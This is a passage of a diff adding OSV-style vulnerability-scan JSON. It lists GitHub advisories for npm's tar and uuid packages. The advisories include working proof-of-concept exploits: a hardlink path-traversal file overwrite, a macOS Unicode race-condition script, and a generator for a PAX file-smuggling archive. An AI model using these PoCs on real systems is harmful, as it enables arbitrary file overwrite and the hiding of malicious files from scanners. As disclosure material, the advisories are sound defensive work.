+                "github_reviewed": true,
+                "github_reviewed_at": "2026-03-10T23:44:58Z",
+                "nvd_published_at": "2026-03-10T07:44:58Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2026-03-10T10:43:54Z",
+              "published": "2026-03-05T00:52:32Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-qffp-2rhf-9h96",
+              "aliases": [
+                "CVE-2026-29786"
+              ],
+              "related": [
+                "CGA-pmvh-3vx6-fx2v"
+              ],
+              "summary": "tar has Hardlink Path Traversal via Drive-Relative Linkpath",
+              "details": "### Summary\n`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.\n\nWhat happens with `linkpath: \"C:../target.txt\"`:\n1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.\n2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.\n3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.\n4. Writing through the extracted hardlink overwrites the outside file.\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.9`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(process.cwd(), 'poc.tar')\n\nfs.writeFileSync(target, 'ORIGINAL\\n')\n\nconst b = Buffer.alloc(1536)\nnew Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(b, 0)\nfs.writeFileSync(tarFile, b)\n\nx({ cwd, file: tarFile }).then(() =\u003e {\n  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\\n')\n  process.stdout.write(fs.readFileSync(target, 'utf8'))\n})\n```\n\nRun:\n\n```bash\ncd test-workspace\nnode poc.cjs \u0026\u0026 ls -l ../target.txt\n```\n\nObserved output:\n\n```text\nPWNED\n-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt\n```\n\n`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.\n\n### Impact\nThis is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.\n\nRealistic scenarios:\n- CLI tools unpacking untrusted tarballs into a working directory\n- build/update pipelines consuming third-party archives\n- services that import user-supplied tar files",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar",
+                    "purl": "pkg:npm/tar"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "7.5.10"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 7.5.9",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-qffp-2rhf-9h96/GHSA-qffp-2rhf-9h96.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:L/SC:N/SI:H/SA:L"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/security/advisories/GHSA-qffp-2rhf-9h96"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-29786"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/commit/7bc755dd85e623c0279e08eb3784909e6d7e4b9f"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/node-tar"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22",
+                  "CWE-59"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-03-05T00:52:32Z",
+                "nvd_published_at": "2026-03-07T16:15:55Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2026-03-16T14:31:36Z",
+              "published": "2026-01-21T01:05:49Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-r6q2-hw4h-h46w",
+              "aliases": [
+                "CVE-2026-23950"
+              ],
+              "related": [
+                "CGA-j5r9-cgjp-w62q"
+              ],
+              "summary": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
+              "details": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p =\u003e {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // \u003c- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" \u003e collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" \u003e collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () =\u003e {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f =\u003e {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 \u0026\u0026 fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar",
+                    "purl": "pkg:npm/tar"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "7.5.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 7.5.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-r6q2-hw4h-h46w/GHSA-r6q2-hw4h-h46w.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23950"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/node-tar"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-176",
+                  "CWE-367"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-01-21T01:05:49Z",
+                "nvd_published_at": "2026-01-20T01:15:57Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2026-06-18T20:29:25Z",
+              "published": "2026-06-15T17:19:42Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-vmf3-w455-68vh",
+              "aliases": [
+                "CVE-2026-53655"
+              ],
+              "related": [
+                "CGA-jg37-pm8g-67gr"
+              ],
+              "summary": "node-tar applies PAX size override to intermediary GNU long-name/long-link headers, causing tar parser interpretation differential (file smuggling)",
+              "details": "### Summary\n\n`tar` (node-tar) applies a PAX extended header's `size=` record (and other PAX\noverrides) to the **next header entry of any type**, including intermediary\nmetadata headers such as a GNU long-name (`L`) or long-link (`K`) entry. Per\nPOSIX pax, a PAX extended header (`x`) describes the *next file entry*, not the\nintermediary extension headers that may sit between the `x` header and the file\nit annotates. Because node-tar lets the PAX `size` override the byte length of\nan intervening `L`/`K`/`x` header, an attacker can desynchronize node-tar's\nstream cursor relative to every other mainstream tar implementation\n(GNU tar, libarchive/bsdtar, Python `tarfile`, and the now-fixed `tar-rs` /\n`astral-tokio-tar`).\n\nThe result is a tar parser **interpretation differential** (CWE-436): a single\ncrafted archive yields a different set of members under node-tar than under the\nreference tar tools. An attacker can use this to hide a member from one parser\nwhile it is visible to another, which defeats security tooling whose scanner and\nextractor disagree on archive contents (e.g. a malware/secret scanner that lists\nentries with one library while a downstream step extracts with another). node-tar\nis one of the most widely deployed JavaScript tar libraries (it backs `npm`'s own\npackage-tarball handling and is a transitive dependency of a very large fraction\nof the npm ecosystem), so the blast radius for \"files that extract differently\ndepending on the tool\" is broad.\n\nThis is the same root cause and fix that was just addressed upstream in the Rust\ntar ecosystem (`tar-rs` / `astral-tokio-tar`); node-tar carries the equivalent\ndefect and has no equivalent guard.\n\n### Impact\n\n- CWE-436 Interpretation Conflict / inconsistent tar parsing (the same class as\n  the prior tar \"smuggling\" advisories GHSA-j5gw-2vrg-8fgx and\n  GHSA-fp55-jw48-c537).\n- A crafted archive can present one logical member list to a tool that lists or\n  scans with node-tar and a different member list to GNU tar / libarchive /\n  Python tarfile (and vice versa). This lets a malicious file be hidden from a\n  scanner that uses a different parser than the eventual extractor, or hidden\n  from node-tar-based inspection while still landing on disk via a system `tar`.\n- No authentication is required; the only precondition is that a victim parses\n  an attacker-supplied tar with node-tar. Tar archives are routinely fetched\n  from untrusted sources (package registries, user uploads, CI artifacts,\n  container layers).\n- Severity: Medium. Impact is integrity-of-archive-interpretation, not direct\n  RCE; it is a building block for supply-chain / scanner-evasion attacks rather\n  than a standalone code-execution primitive.\n\n### Vulnerable code (file:line)\n\n`src/header.ts` (compiled to `dist/esm/header.js:49` and\n`dist/commonjs/header.js:85` in the published `tar@7.5.15`):\n\n```ts\n// Header.decode(buf, off, ex, gex)\nthis.size = ex?.size ?? gex?.size ?? decNumber(buf, off + 124, 12)\n```\n\n`ex` is the currently-accumulated PAX **local** extended header and `gex` the\nPAX **global** header. The `size` override from `ex`/`gex` is applied\nunconditionally to whatever header is being decoded next — there is no check\nthat the header being decoded is a real *file* entry rather than an intermediary\nextension header.\n\n`src/parse.ts`, `[CONSUMEHEADER]` constructs the next header with the current\n`EX`/`GEX` applied:\n\n```ts\nconst header = new Header(chunk, position, this[EX], this[GEX])\n```\n\nand later branches on whether that header is a metadata entry. `this[EX]` is\ncleared only in the non-meta (real file) branch:\n\n```ts\nif (entry.meta) {\n  // L / K / x / g metadata entries: this[EX] is left intact here\n  if (entry.size \u003e this.maxMetaEntrySize) {\n    entry.ignore = true\n    this[STATE] = 'ignore'\n    entry.resume()\n  } else if (entry.size \u003e 0) {\n    this[META] = ''\n    entry.on('data', c =\u003e (this[META] += c))\n    this[STATE] = 'meta'\n  }\n} else {\n  this[EX] = undefined   // EX cleared only once a real file entry is reached\n}\n```\n\nWhen the stream is ordered `x (PAX, size=N) -\u003e L (GNU long-name) -\u003e file`, the\n`L` header is constructed with `this[EX]` still set, so its `size`/`remain`\nbecomes `N` instead of the `L` payload's true length. node-tar then consumes `N`\nbytes of \"metadata\" and resumes header parsing at the wrong offset, landing\nmid-stream. Every other mainstream parser applies the PAX `size` only to the\nfollowing *file* entry, so they stay synchronized.\n\nThe correct behavior (and the fix shipped upstream in the Rust tar ecosystem) is\nto **not** apply PAX `size`/overrides when the entry being decoded is itself an\nextension header (`L` GNU long-name, `K` GNU long-link, `x` PAX local, `g` PAX\nglobal).\n\n### How input reaches the sink\n\n`tar.list()`, `tar.extract()`/`tar.x()`, and `tar.Parse`/`tar.Unpack` all route\nevery 512-byte header block through `Header.decode(...)` with the\ncurrently-accumulated `EX`/`GEX`. Any consumer that parses an attacker-supplied\narchive — `tar.list`, `tar.extract`, or piping into the streaming `Parser` —\nreaches the sink. No options need to be enabled; the default code path is\naffected.\n\n### Proof of concept\n\nArchive layout (all standard, GNU-tar-producible blocks):\n\n```\nblock 0 : x  header  (PAX local extended, typeflag 'x'), its own size = len(pax body)\nblock 1 : x  payload : the single PAX record  \"...size=2048\\n\"\nblock 2 : L  header  (GNU long-name '././@LongLink'), real size = 13\nblock 3 : L  payload : \"longname.txt\\0\"      (the long name for the next file)\nblock 4 : file header 'file_a', size = 16\nblock 5 : file_a body (16 bytes, zero-padded to 512)\nblock 6 : file header 'file_b', size = 16\nblock 7 : file_b body (16 bytes, zero-padded to 512)\n```\n\nGenerator (`make_tar.py`, pure stdlib, no external deps):\n\n```python\ndef hdr(name, size, typeflag):\n    h = bytearray(512); name = name[:100]; h[0:len(name)] = name\n    h[100:108] = b'0000644\\0'; h[108:116] = b'0000000\\0'; h[116:124] = b'0000000\\0'\n    h[124:136] = ('%011o\\0' % size).encode(); h[136:148] = b'00000000000\\0'\n    h[156:157] = typeflag; h[257:263] = b'ustar\\0'; h[263:265] = b'00'\n    h[148:156] = b' ' * 8\n    cs = sum(h); h[148:156] = ('%06o\\0 ' % cs).encode()\n    return bytes(h)\n\ndef pad(d):\n    return d + b'\\0' * ((512 - len(d) % 512) % 512)\n\ndef pax_record(key, val):              # length-prefixed PAX record \"LEN key=val\\n\"\n    body = b' %s=%s\\n' % (key.encode(), str(val).encode()); n = len(body)\n    while True:\n        s = str(n).encode() + body\n        if len(s) == n: break\n        n = len(s)\n    return s\n\npax = pax_record('size', 2048)         # malicious: claim size=2048 for the \"next\" entry\nout  = hdr(b'PaxHeaders/x', len(pax), b'x') + pad(pax)\nout += hdr(b'././@LongLink', 13, b'L') + pad(b'longname.txt\\0')\nout += hdr(b'file_a', 16, b'0')        + pad(b'AAAA_file_a_body')\nout += hdr(b'file_b', 16, b'0')        + pad(b'BBBB_file_b_body')\nout += b'\\0' * 1024\nopen('pax-desync.tar', 'wb').write(out)\n```\n\nA negative-control archive is identical except the PAX record is\n`pax_record('comment', 'x')` (no `size=`), written to `pax-control.tar`.\n\n### End-to-end reproduction (against pinned version `tar@7.5.15`, latest release)\n\nInstall the published package into a clean project and parse both archives:\n\n```\n$ npm init -y \u003e/dev/null \u0026\u0026 npm install tar@7.5.15\n$ node -e \"console.log(require('tar/package.json').version)\"\n7.5.15\n$ grep -n \"ex?.size ?? gex?.size\" node_modules/tar/dist/esm/header.js\n49:        this.size = ex?.size ?? gex?.size ?? decNumber(buf, off + 124, 12);\n```\n\n`e2e.mjs`:\n\n```js\nimport * as tar from 'tar'\nasync function listEntries(f){\n  const got=[], warns=[]\n  await tar.list({ file:f, onReadEntry:e=\u003e{ got.push({path:e.path,size:e.size,type:e.type}); e.resume() },\n                   onwarn:(code,_msg)=\u003ewarns.push(code) })\n  return { got, warns }\n}\nconst mal = await listEntries('pax-desync.tar')\nconsole.log('MALICIOUS entries :', JSON.stringify(mal.got), 'warnings:', JSON.stringify(mal.warns))\nconst ctl = await listEntries('pax-control.tar')\nconsole.log('CONTROL  entries :', JSON.stringify(ctl.got), 'warnings:', JSON.stringify(ctl.warns))\n```\n\nVerbatim output:\n\n```\n=== Deployed-consumer E2E: npm tar@7.5.15 (latest release) ===\n\n[MALICIOUS] archive = x(PAX size=2048) -\u003e L(GNU longname \"longname.txt\") -\u003e file_a(16B) -\u003e file_b(16B)\n  tar.list() entries : []\n  tar.list() warnings: [\"TAR_ENTRY_INVALID\"]\n\n[NEGATIVE CONTROL] same archive, PAX record is \"comment=x\" (no size= override)\n  tar.list() entries : [{\"path\":\"longname.txt\",\"size\":16,\"type\":\"File\"},{\"path\":\"file_b\",\"size\":16,\"type\":\"File\"}]\n  tar.list() warnings: []\n```\n\nReference parsers on the **same** `pax-desync.tar`:\n\n```\n$ tar tvf pax-desync.tar\n-rw-r--r--  0 0      0        2048 Jan  1  1970 longname.txt          # GNU tar\n\n$ bsdtar tvf pax-desync.tar\n-rw-r--r--  0 0      0        2048 Jan  1  1970 longname.txt          # libarchive\n\n$ python3 -c \"import tarfile; print([m.name for m in tarfile.open('pax-desync.tar').getmembers()])\"\n['longname.txt']                                                      # Python tarfile\n```\n\nInterpretation differential: GNU tar, libarchive (bsdtar), and Python `tarfile`\nall extract the member `longname.txt` from `pax-desync.tar`, whereas node-tar\n`7.5.15` desynchronizes, raises `TAR_ENTRY_INVALID` (checksum failure from\nlanding mid-stream), and reports **zero** members. The negative control proves\nthe divergence is caused solely by the PAX `size=` override being applied to the\nintermediary `L` header — when the same archive carries a PAX record without\n`size=`, node-tar parses it identically to the reference tools\n(`longname.txt`, `file_b`).\n\n### Suggested fix\n\nWhen decoding a header, do not apply PAX `size` (or other PAX overrides) if the\nheader being decoded is itself an extension header. Concretely, in\n`src/parse.ts` clear/ignore `this[EX]` (and `this[GEX]` for `size`) when the\nheader's type is `ExtendedHeader`, `GlobalExtendedHeader`, `NextFileHasLongPath`\n(GNU `L`), or `NextFileHasLongLinkpath` (GNU `K`); equivalently, in\n`Header.decode`, gate the `ex?.size ?? gex?.size` override on the decoded type\nnot being one of those extension types. This mirrors the upstream Rust fix,\nwhich guards `pax_size` with\n`is_gnu_longname || is_gnu_longlink || is_pax_local_extensions || is_pax_global_extensions`.\n\nA fix PR is being prepared against a private fork and will be linked here.\n\n### Fix PR\n\nTo be linked from a private fork of the repository (the fix will not be pushed\nto any public fork or to upstream during embargo).\n\n### Credits\n\nReported by tonghuaroot.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar",
+                    "purl": "pkg:npm/tar"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "7.5.16"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 7.5.15",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-vmf3-w455-68vh/GHSA-vmf3-w455-68vh.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/security/advisories/GHSA-vmf3-w455-68vh"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/node-tar"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-436"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-06-15T17:19:42Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-34x7-hfp2-rc4v"
+              ],
+              "aliases": [
+                "CVE-2026-24842",
+                "GHSA-34x7-hfp2-rc4v"
+              ],
+              "max_severity": "8.2"
+            },
+            {
+              "ids": [
+                "GHSA-83g3-92jg-28cx"
+              ],
+              "aliases": [
+                "CVE-2026-26960",
+                "GHSA-83g3-92jg-28cx"
+              ],
+              "max_severity": "7.1"
+            },
+            {
+              "ids": [
+                "GHSA-8qq5-rm4j-mr97"
+              ],
+              "aliases": [
+                "CVE-2026-23745",
+                "GHSA-8qq5-rm4j-mr97"
+              ],
+              "max_severity": "8.2"
+            },
+            {
+              "ids": [
+                "GHSA-9ppj-qmqm-q256"
+              ],
+              "aliases": [
+                "CVE-2026-31802",
+                "GHSA-9ppj-qmqm-q256"
+              ],
+              "max_severity": "8.2"
+            },
+            {
+              "ids": [
+                "GHSA-qffp-2rhf-9h96"
+              ],
+              "aliases": [
+                "CVE-2026-29786",
+                "GHSA-qffp-2rhf-9h96"
+              ],
+              "max_severity": "8.2"
+            },
+            {
+              "ids": [
+                "GHSA-r6q2-hw4h-h46w"
+              ],
+              "aliases": [
+                "CVE-2026-23950",
+                "GHSA-r6q2-hw4h-h46w"
+              ],
+              "max_severity": "8.8"
+            },
+            {
+              "ids": [
+                "GHSA-vmf3-w455-68vh"
+              ],
+              "aliases": [
+                "CVE-2026-53655",
+                "GHSA-vmf3-w455-68vh"
+              ],
+              "max_severity": "6.9"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "uuid",
+            "version": "7.0.3",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2026-05-21T18:30:08Z",
+              "published": "2026-04-22T20:53:24Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-w5hq-g745-h8pq",
+              "aliases": [
+                "CVE-2026-41907"
+              ],
+              "related": [
+                "CGA-cfw7-cq6w-m5hj"
+              ],
+              "summary": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+              "details": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=\u003ev4({},new Uint8Array(8),4)],\n  ['v5()',()=\u003ev5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=\u003ev6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset \u003c 0 || offset + 16 \u003e buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "uuid",
+                    "purl": "pkg:npm/uuid"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "11.1.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5hq-g745-h8pq/GHSA-w5hq-g745-h8pq.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "uuid",
+                    "purl": "pkg:npm/uuid"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "12.0.0"
+                        },
+                        {
+                          "fixed": "12.0.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5hq-g745-h8pq/GHSA-w5hq-g745-h8pq.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "uuid",
+                    "purl": "pkg:npm/uuid"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "13.0.0"
+                        },
+                        {
+                          "fixed": "13.0.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w5hq-g745-h8pq/GHSA-w5hq-g745-h8pq.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41907"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/uuidjs/uuid"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v11.1.1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v12.0.1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v13.0.1"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/uuidjs/uuid/releases/tag/v14.0.0"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1285",
+                  "CWE-787"
+                ],
